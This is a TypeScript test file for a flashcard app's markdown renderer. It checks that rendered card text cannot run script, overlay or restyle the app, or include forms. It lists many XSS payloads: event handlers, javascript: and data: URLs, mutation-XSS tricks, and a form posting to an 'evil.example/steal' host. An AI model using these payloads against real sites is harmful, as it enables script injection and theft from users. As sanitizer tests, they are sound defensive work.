// Hazard 14: question text, card text and anything imported or synced is rendered as
// HTML inside the app's own window. It may format, but never act: no script, nothing
// that covers or restyles the app, no forms, nothing loaded from elsewhere by itself.
import { describe, expect, it } from "vitest";
import { grammarsReady, renderInlineMarkdown, renderMarkdown } from "./markdown";

const both = (text: string) => [renderMarkdown(text), renderInlineMarkdown(text)];
const dom = (html: string) => new DOMParser().parseFromString(`<body>${html}</body>`, "text/html").body;

describe("what rendered text can't do", () => {
  it("runs no script by any route", () => {
    const attacks = [
      `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)><script>alert(1)</script></svg>`, `[x](javascript:alert(1))`,
      `<a href="javascript:alert(1)">x</a>`, `<a href="data:text/html,<script>alert(1)</script>">x</a>`, `<a href="vbscript:msgbox(1)">x</a>`, `<iframe src="https://evil.example"></iframe>`,
      `<object data="x"></object><embed src="x">`, `<base href="https://evil.example/">`, `<meta http-equiv="refresh" content="0;url=https://evil.example">`, `<link rel="stylesheet" href="https://evil.example/x.css">`,
      `<details open ontoggle=alert(1)>x</details>`, `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">`, `$\\href{javascript:alert(1)}{x}$`,
      "```js\" onmouseover=\"alert(1)\nx\n```", `![a"onerror="alert(1)](image:1)`, `<textarea autofocus onfocus=alert(1)></textarea>`, `<button formaction="javascript:alert(1)">x</button>`,
    ];
    for (const attack of attacks) {
      for (const html of both(attack)) {
        const body = dom(html);
        expect(body.querySelector("script, iframe, object, embed, base, meta, link, style"), attack).toBeNull();
        for (const element of body.querySelectorAll("*")) {
          for (const attribute of element.attributes) {
            expect(attribute.name.startsWith("on"), `${attack} kept ${attribute.name}`).toBe(false);
            expect(/^\s*(javascript|vbscript|data:text\/html)/i.test(attribute.value), `${attack} kept ${attribute.name}="${attribute.value}"`).toBe(false);
          }
        }
      }
    }
  });

  it("can't cover or restyle the app: no style, class or id of its own", () => {
    const attacks = [
      `<div style="position:fixed;inset:0;z-index:9999;background:#000">cover</div>`, `<div class="fixed inset-0 z-50 bg-base-100">cover</div>`, `<p class="btn btn-primary">Fake button</p>`,
      `<style>body{display:none}</style>`, `<div id="app">x</div>`, `<span class="katex"><div style="position:fixed;inset:0">cover</div></span>`,
      `<pre class="shiki" style="position:fixed;inset:0"><code>x</code></pre>`, `<span data-trusted="1" style="position:fixed">x</span>`, `**x** <b style="position:fixed;top:0">y</b>`,
    ];
    for (const attack of attacks) {
      for (const html of both(attack)) {
        const body = dom(html);
        for (const element of body.querySelectorAll("*")) {
          expect(element.getAttribute("style"), `${attack} → ${html}`).toBeNull();
          expect(element.getAttribute("id"), `${attack} → ${html}`).toBeNull();
          expect(element.getAttribute("data-trusted"), `${attack} → ${html}`).toBeNull();
          const classes = (element.getAttribute("class") ?? "").split(/\s+/).filter(Boolean);
          expect(classes.filter((name) => !/^(cloze-gap|cloze-answer|language-[\w+#.-]+)$/.test(name)), `${attack} → ${html}`).toEqual([]);
        }
      }
    }
  });

  it("has no forms or controls", () => {
    for (const html of both(`<form action="https://evil.example/steal"><input name="q" value="x"><select><option>a</option></select><textarea>t</textarea><button>Continue</button></form> <audio src="https://evil.example/a.mp3" autoplay></audio><video src="x"></video><dialog open>x</dialog>`)) {
      expect(dom(html).querySelector("form, input, button, select, option, textarea, audio, video, source, track, dialog"), html).toBeNull();
    }
  });

  it("keeps what the app itself writes: maths, highlighted code and cloze gaps", async () => {
    const maths = renderMarkdown("Time is $T = \\frac{N}{f}$ seconds");
    expect(maths).toContain('class="katex"');
    expect(maths).toMatch(/style="[^"]*height:/);
    renderMarkdown("```rust\nfn main() {}\n```");
    await grammarsReady();
    const code = renderMarkdown("```rust\nfn main() { let x = 1; }\n```");
    expect(code).toContain('class="shiki');
    expect(code).toContain("--shiki-dark:");
    expect(code).not.toContain("data-trusted");
    expect(renderMarkdown('L3 is <span class="cloze-gap">[...]</span> and <span class="cloze-answer">40</span>')).toContain('<span class="cloze-gap">[...]</span>');
    expect(renderMarkdown("**bold** <sub>2</sub> <kbd>Ctrl</kbd>\n\n| a | b |\n|---|---|\n| 1 | 2 |")).toMatch(/<strong>bold<\/strong>.*<sub>2<\/sub>.*<kbd>Ctrl<\/kbd>[\s\S]*<table>/);
  });

  it("gives back plain text instead of failing when the renderer itself breaks", () => {
    const deep = "<div>".repeat(5000) + "a";
    expect(() => renderMarkdown(deep)).not.toThrow();
    expect(() => renderInlineMarkdown(deep)).not.toThrow();
    expect(renderMarkdown(deep)).not.toContain("<script");
  }, 60000);
});
